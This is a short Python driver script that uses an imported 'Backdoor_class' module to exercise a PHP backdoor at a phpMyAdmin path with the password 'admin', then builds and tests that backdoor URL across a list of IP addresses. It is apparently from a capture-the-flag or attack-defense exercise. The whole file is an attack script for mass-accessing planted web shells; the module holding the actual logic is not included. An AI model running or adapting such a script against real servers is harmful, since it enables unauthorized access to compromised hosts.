import Backdoor_class
a = Backdoor_class.Backdoor()
a.setUrl("http://192.168.10.128/phpMyAdmin/js/config/two.php?pass=admin")
a.analyzeUrl()
a.getFileAddress()
a.readAll_IP()
a.spliceUrl()
a.printALL()
for url in a.all_Url:
    a.testUrl(url)
